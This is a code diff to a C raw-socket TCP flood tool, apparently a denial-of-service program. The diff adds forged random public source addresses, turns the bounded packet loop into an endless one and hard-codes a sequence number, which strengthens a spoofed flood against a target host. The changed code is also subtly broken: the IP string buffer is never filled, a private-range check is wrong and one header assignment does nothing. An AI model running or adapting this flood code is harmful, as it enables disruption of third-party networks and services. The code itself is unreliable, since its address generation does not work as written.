@@ -50,6 +50,50 @@ unsigned long int rand_cmwc(void)
 	}
 	return (Q[i] = r - x);
 }
+static uint8_t ipState[5];
+in_addr_t getRandomPublicIP()
+{
+	if(ipState[1] < 255 && ipState[2] < 255 && ipState[3] < 255 && ipState[4] < 255)
+        {
+                ipState[1]++;
+		ipState[2]++;
+		ipState[3]++;
+		ipState[4]++;
+                char ip[16];
+                //printf(ip, "%d.%d.%d.%d", ipState[1], ipState[2], ipState[3], ipState[4]);
+		return inet_addr(ip);
+        }
+
+	ipState[1] = 0;
+	ipState[2] = 0;
+        ipState[3] = 0;
+	ipState[4] = 0;
+        while(
+                (ipState[1] == 0) ||
+                (ipState[1] == 10) ||
+                (ipState[1] == 100 && (ipState[2] >= 64 && ipState[2] <= 127)) ||
+                (ipState[1] == 127) ||
+                (ipState[1] == 169 && ipState[2] == 254) ||
+                (ipState[1] == 172 && (ipState[2] <= 16 && ipState[2] <= 31)) ||
+                (ipState[1] == 192 && ipState[2] == 0 && ipState[3] == 2) ||
+                (ipState[1] == 192 && ipState[2] == 88 && ipState[3] == 99) ||
+                (ipState[1] == 192 && ipState[2] == 168) ||
+                (ipState[1] == 198 && (ipState[2] == 18 || ipState[2] == 19)) ||
+                (ipState[1] == 198 && ipState[2] == 51 && ipState[3] == 100) ||
+                (ipState[1] == 203 && ipState[2] == 0 && ipState[3] == 113) ||
+                (ipState[1] >= 224)
+        )
+        {
+                ipState[1] = rand() % 150;
+        	ipState[2] = rand() % 150;
+        	ipState[3] = rand() % 150;
+		ipState[4] = rand() % 150;
+        }
+
+	char ip[16];
+        //printf(ip, "%d.%d.%d.%d", ipState[1], ipState[2], ipState[3], ipState[4]);
+	return inet_addr(ip);
+}
 in_addr_t getRandomIP(in_addr_t netmask)
 {
         in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
@@ -100,7 +144,7 @@ void setup_ip_header(struct iphdr *iph)
 	iph->ttl = MAXTTL;
 	iph->protocol = 6;
 	iph->check = 0;
-	iph->saddr = inet_addr("192.168.3.100");
+	iph->saddr;
 }
 
 void setup_tcp_header(struct tcphdr *tcph)
@@ -128,7 +172,7 @@ void *flood(void *par1)
 	sin.sin_port = htons(floodport);
 	sin.sin_addr.s_addr = inet_addr(td);
 
-	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+	int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
 	if(s < 0){
 		fprintf(stderr, "Could not open raw socket.\n");
 		exit(-1);
@@ -152,7 +196,7 @@ void *flood(void *par1)
 	init_rand(time(NULL));
 	register unsigned int i;
 	i = 0;
-	while(i < 10000){
+	while(1){
 		in_addr_t netmask;
 
                 if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
@@ -160,11 +204,11 @@ void *flood(void *par1)
 		
 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
 
-		iph->saddr = htonl( getRandomIP(netmask) );
-		iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
+		iph->saddr = htonl( getRandomPublicIP() );
+		iph->id = htonl(rand());
 		iph->check = csum ((unsigned short *) datagram, iph->tot_len);
-		tcph->seq = rand_cmwc() & 0xFFFF;
-		tcph->source = htons(rand_cmwc() & 0xFFFF);
+		tcph->seq = htons(1337);
+		tcph->source = htons(rand());
 		tcph->check = 0;
 		tcph->check = tcpcsum(iph, tcph);
 		
